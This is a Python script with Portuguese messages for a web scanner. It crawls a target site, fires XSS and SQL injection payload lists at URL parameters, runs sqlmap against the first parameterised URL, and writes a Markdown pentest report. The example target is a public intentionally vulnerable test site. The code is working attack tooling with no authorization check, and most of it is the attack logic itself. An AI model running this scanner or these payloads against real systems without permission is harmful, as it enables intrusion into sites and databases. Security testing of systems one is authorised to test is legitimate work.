import requests
import argparse
import subprocess
import sys

from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlencode
from datetime import datetime


TIMEOUT = 5

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>"
]

SQL_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1'--",
    "' OR 1=1#"
]


class WebScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.endpoints = []
        self.xss_results = []
        self.sqli_results = []
        self.sqlmap_output = ""
        
    def is_valid_url(self, url):
        parsed = urlparse(url)
        return parsed.scheme in ("http", "https")
    
    def is_same_domain(self, url):
        return urlparse(self.target_url).netloc == urlparse(url).netloc
    
    def crawl(self):
        print("[*] Iniciando descoberta de endpoints...")
        to_visit = [self.target_url]
        visited = set()
        
        while to_visit:
            current_url = to_visit.pop(0)
            
            if current_url in visited:
                continue
                
            visited.add(current_url)
            
            try:
                response = requests.get(current_url, timeout=TIMEOUT)
            except:
                continue
            
            self.endpoints.append(current_url)
            soup = BeautifulSoup(response.text, "html.parser")
            
            for link in soup.find_all("a"):
                href = link.get("href")
                if not href:
                    continue
                    
                full_url = urljoin(current_url, href)
                
                if not self.is_valid_url(full_url):
                    continue
                if not self.is_same_domain(full_url):
                    continue
                if full_url not in visited and full_url not in to_visit:
                    to_visit.append(full_url)
        
        print(f"[+] {len(self.endpoints)} endpoints descobertos\n")
        
    def extract_params(self, url):
        parsed = urlparse(url)
        params = {}
        
        if parsed.query:
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    key, _ = pair.split("=", 1)
                    params[key] = "test"
        
        return params
    
    def scan_xss(self):
        print("[*] Executando scanner de XSS...")
        
        for url in self.endpoints:
            params = self.extract_params(url)
            if not params:
                continue
                
            for param in params:
                for payload in XSS_PAYLOADS:
                    test_params = params.copy()
                    test_params[param] = payload
                    query = urlencode(test_params)
                    test_url = f"{url.split('?')[0]}?{query}"
                    
                    try:
                        response = requests.get(test_url, timeout=TIMEOUT)
                        if payload in response.text:
                            result = {
                                'url': test_url,
                                'param': param,
                                'payload': payload
                            }
                            self.xss_results.append(result)
                            print(f"[+] XSS encontrado: {url} (param: {param})")
                    except:
                        continue
        
        print(f"[+] {len(self.xss_results)} vulnerabilidades XSS encontradas\n")
    
    def scan_sqli(self):
        print("[*] Executando scanner de SQL Injection...")
        
        for url in self.endpoints:
            params = self.extract_params(url)
            if not params:
                continue
            
            base_query = urlencode(params)
            base_url = f"{url.split('?')[0]}?{base_query}"
            
            try:
                base_response = requests.get(base_url, timeout=TIMEOUT)
                base_len = len(base_response.text)
            except:
                continue
            
            for param in params:
                for payload in SQL_PAYLOADS:
                    test_params = params.copy()
                    test_params[param] = payload
                    query = urlencode(test_params)
                    test_url = f"{url.split('?')[0]}?{query}"
                    
                    try:
                        response = requests.get(test_url, timeout=TIMEOUT)
                        diff = abs(len(response.text) - base_len)
                        
                        if diff > 50:
                            result = {
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'diff': diff
                            }
                            self.sqli_results.append(result)
                            print(f"[+] SQL encontrado: {url} (param: {param})")
                    except:
                        continue
        
        print(f"[+] {len(self.sqli_results)} vulnerabilidades SQLi encontradas\n")
    
    def run_sqlmap(self):
        print("[*] Executando sqlmap...")
        
        urls_with_params = [url for url in self.endpoints if '?' in url]
        
        target = urls_with_params[0]
        
        bash = [
            "sqlmap",
            "-u", target,
            "--batch",
            "--level=1",
            "--risk=1",
            "--threads=2"
        ]
        
        try:
            result = subprocess.run(
                bash,
                capture_output=True,
                text=True,
                timeout=120
            )
            self.sqlmap_output = result.stdout
            print("[+] sqlmap executado com sucesso\n")

        except Exception as e:
            self.sqlmap_output = f"Erro ao executar sqlmap: {str(e)}"
            print(f"[!] Erro no sqlmap: {e}\n")
    
    def relatorio(self):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        report = f"""# Relatório de Pentest Web
        
## Informações Gerais
- **URL Alvo**: {self.target_url}
- **Data**: {timestamp}
- **Endpoints Descobertos**: {len(self.endpoints)}

---

## URLS Descobertos

Total: {len(self.endpoints)}

"""
        
        for i, endpoint in enumerate(self.endpoints[:20], 1):
            report += f"{i}. {endpoint}\n"
        
        if len(self.endpoints) > 20:
            report += f"\n... e mais {len(self.endpoints) - 20} endpoints\n"
        
        report += "\n---\n\n## Resultados - Scanner XSS\n\n"
        

        if self.xss_results:
            report += f"**Vulnerabilidades encontradas**: {len(self.xss_results)}\n\n"
            for i, result in enumerate(self.xss_results, 1):
                report += f"### Vulnerabilidade {i}\n"
                report += f"- **URL**: {result['url']}\n"
                report += f"- **Parâmetro**: {result['param']}\n"
                report += f"- **Payload**: `{result['payload']}`\n\n"
        else:
            report += "Nenhuma vulnerabilidade XSS detectada.\n\n"
        
        report += "---\n\n## Resultados - Scanner SQL Injection\n\n"
        

        if self.sqli_results:
            report += f"**Vulnerabilidades encontradas**: {len(self.sqli_results)}\n\n"
            for i, result in enumerate(self.sqli_results, 1):
                report += f"### Vulnerabilidade {i}\n"
                report += f"- **URL**: {result['url']}\n"
                report += f"- **Parâmetro**: {result['param']}\n"
                report += f"- **Payload**: `{result['payload']}`\n"
                report += f"- **Diferença de resposta**: {result['diff']} bytes\n\n"
        else:
            report += "Nenhuma vulnerabilidade SQLi detectada.\n\n"
        

        report += "---\n\n## Resultados - sqlmap\n\n"
        report += "```\n"
        report += self.sqlmap_output[:2000]
        if len(self.sqlmap_output) > 2000:
            report += "\n... (saída truncada)\n"
        report += "\n```\n\n"
        
        report += "---\n\n## Conclusão\n\n"
        report += f"A varredura identificou {len(self.xss_results)} possíveis vulnerabilidades XSS "
        report += f"e {len(self.sqli_results)} possíveis vulnerabilidades SQL Injection nos "
        report += f"{len(self.endpoints)} endpoints descobertos.\n\n"
        report += "Os resultados devem ser validados manualmente para eliminar falsos positivos.\n"
        
        filename = f"relatorio_{urlparse(self.target_url).netloc}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)
        
        print(f"[+] Relatório gerado: {filename}")
        

        return filename
    
    def run(self):
        print(f"\n{'='*60}")
        print(f"Scanner Web Integrado")
        print(f"{'='*60}\n")
        print(f"Alvo: {self.target_url}\n")
        
        self.crawl()
        self.scan_xss()
        self.scan_sqli()
        self.run_sqlmap()
        report_file = self.relatorio()
        
        print(f"\n{'='*60}")
        print("Scan finalizado!")
        print(f"{'='*60}\n")
        
        return report_file


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Scanner web'
    )
    parser.add_argument(
        'url',
        help='alvo http://testphp.vulnweb.com'
    )
    
    args = parser.parse_args()
    
    scanner = WebScanner(args.url)
    scanner.run()
